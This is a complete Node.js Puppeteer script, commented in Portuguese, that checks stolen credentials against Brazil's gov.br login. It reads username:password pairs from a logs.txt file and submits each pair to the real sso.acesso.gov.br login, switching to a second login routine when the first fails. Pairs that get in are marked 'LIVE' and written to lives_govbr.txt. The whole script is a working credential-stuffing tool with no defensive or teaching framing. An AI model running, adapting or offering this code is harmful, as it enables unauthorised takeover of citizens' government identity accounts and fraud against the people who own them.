const fs = require("fs");
const puppeteer = require("puppeteer");

async function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

async function tentarLoginGovBR(usuario, senha) {
  const navegador = await puppeteer.launch({ 
    headless: true, 
    defaultViewport: null,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  const page = await navegador.newPage();

  try {
    await page.goto("https://sso.acesso.gov.br/login", {
      waitUntil: "networkidle2",
      timeout: 60000
    });

    await page.waitForSelector("#accountId", { timeout: 20000 });
    
    await page.type("#accountId", usuario, { delay: 50 });
    
    await page.click("#enter-account");
    
    await delay(3000);
    
    const senhaSelector = "#password";
    const senhaExiste = await page.$(senhaSelector).catch(() => null);
    
    if (!senhaExiste) {
      const erroUsuario = await page.$eval(".erro", el => el.innerText).catch(() => null);
      if (erroUsuario && erroUsuario.includes("não encontrada")) {
        await navegador.close();
        return false;
      }
    }
    
    await page.waitForSelector(senhaSelector, { timeout: 10000 });

    await page.type(senhaSelector, senha, { delay: 50 });
    
    await page.click("#enter-password");
    
    await delay(6000);
    
    const urlAtual = page.url();
    
    if (urlAtual.includes("login") || urlAtual.includes("sso")) {
      await navegador.close();
      return false;
    }
    
    const erroSenha = await page.$eval(".error-message, .erro, .alert-danger", 
      el => el.innerText).catch(() => null);
    
    if (erroSenha && (erroSenha.includes("incorreta") || erroSenha.includes("inválida"))) {
      await navegador.close();
      return false;
    }
    
    const titulo = await page.title().catch(() => "");
    const bodyText = await page.$eval("body", el => el.innerText).catch(() => "");
    
    if (titulo.includes("Gov.br") || bodyText.includes("Minha conta") || 
        bodyText.includes("Bem-vindo") || !urlAtual.includes("sso")) {
      await navegador.close();
      return true;
    }
    
    await navegador.close();
    return false;
    
  } catch (error) {
    console.error(`Erro ao testar ${usuario}:`, error.message);
    await navegador.close();
    return false;
  }
}

async function tentarLoginGovBRAlternativo(usuario, senha) {
  const navegador = await puppeteer.launch({ 
    headless: true, 
    defaultViewport: null,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  const page = await navegador.newPage();

  try {
    await page.goto("https://acesso.gov.br/", {
      waitUntil: "networkidle2",
      timeout: 60000
    });

    const loginBtn = await page.$x("//a[contains(text(), 'Entrar') or contains(text(), 'Login') or contains(text(), 'Acessar')]");
    
    if (loginBtn.length > 0) {
      await loginBtn[0].click();
      await delay(3000);
    }
    
    await page.waitForSelector("#accountId, input[name='username'], input[name='cpf'], input[type='email']", { timeout: 15000 });
    
    const campoUsuario = await page.$("#accountId") || 
                         await page.$("input[name='username']") ||
                         await page.$("input[name='cpf']") ||
                         await page.$("input[type='email']");
    
    await campoUsuario.type(usuario, { delay: 50 });
    
    const continuarBtn = await page.$x("//button[contains(text(), 'Continuar') or contains(text(), 'Entrar') or contains(text(), 'Avançar')]");
    
    if (continuarBtn.length > 0) {
      await continuarBtn[0].click();
    } else {
      await page.keyboard.press('Enter');
    }
    
    await delay(4000);
    
    const campoSenha = await page.$("#password, input[name='password'], input[type='password']");
    
    if (!campoSenha) {
      await navegador.close();
      return false;
    }
    
    await campoSenha.type(senha, { delay: 50 });
    
    const loginSubmit = await page.$x("//button[contains(text(), 'Entrar') or @type='submit']");
    
    if (loginSubmit.length > 0) {
      await loginSubmit[0].click();
    } else {
      await page.keyboard.press('Enter');
    }
    
    await delay(8000);
    
    const urlAtual = page.url();
    const titulo = await page.title().catch(() => "");
    
    if (!urlAtual.includes("login") && !urlAtual.includes("sso") && 
        !titulo.includes("Login") && !titulo.includes("Entrar")) {
      
      const erro = await page.$eval(".error, .alert-danger, .erro, .msg-erro", 
        el => el.innerText).catch(() => null);
      
      if (!erro || (!erro.includes("incorreta") && !erro.includes("inválida"))) {
        await navegador.close();
        return true;
      }
    }
    
    await navegador.close();
    return false;
    
  } catch (error) {
    await navegador.close();
    return false;
  }
}

(async () => {
  if (!fs.existsSync("logs.txt")) {
    console.error("❌ Arquivo logs.txt não encontrado!");
    return;
  }
  
  const logins = fs.readFileSync("logs.txt", "utf8")
    .split('\n')
    .filter(l => l.trim())
    .map(l => {
      const [usuario, senha] = l.split(':').map(s => s.trim());
      return { usuario, senha };
    })
    .filter(l => l.usuario && l.senha);
  
  console.log("\n🔐 Testando logins gov.br...\n");
  console.log(`📊 Total de credenciais para testar: ${logins.length}\n`);
  
  const livesFile = "lives_govbr.txt";
  
  if (fs.existsSync(livesFile)) {
    fs.unlinkSync(livesFile);
  }
  
  let validos = 0;
  let testados = 0;
  
  for (let cred of logins) {
    testados++;
    const { usuario, senha } = cred;
    
    console.log(`[${testados}/${logins.length}] Testando: ${usuario}`);
    
    let valido = await tentarLoginGovBR(usuario, senha);
    
    if (!valido) {
      console.log(`   ⚠️  Primeiro método falhou, tentando alternativa...`);
      valido = await tentarLoginGovBRAlternativo(usuario, senha);
    }
    
    if (valido) {
      validos++;
      console.log(`   ✅ LIVE: ${usuario}:${senha}`);
      fs.appendFileSync(livesFile, `${usuario}:${senha}\n`);
    } else {
      console.log(`   ❌ DIE: ${usuario}`);
    }
    
    await delay(2000);
  }

  const livesSalvos = fs.existsSync(livesFile) 
    ? fs.readFileSync(livesFile, "utf8").split('\n').filter(l => l.trim())
    : [];
  
  console.log(`\n🏁 Finalizado!`);
  console.log(`📈 Resultados:`);
  console.log(`   ✅ Logins válidos: ${validos}`);
  console.log(`   ❌ Logins inválidos: ${logins.length - validos}`);
  console.log(`   💾 Salvos em: ${livesFile}`);
})();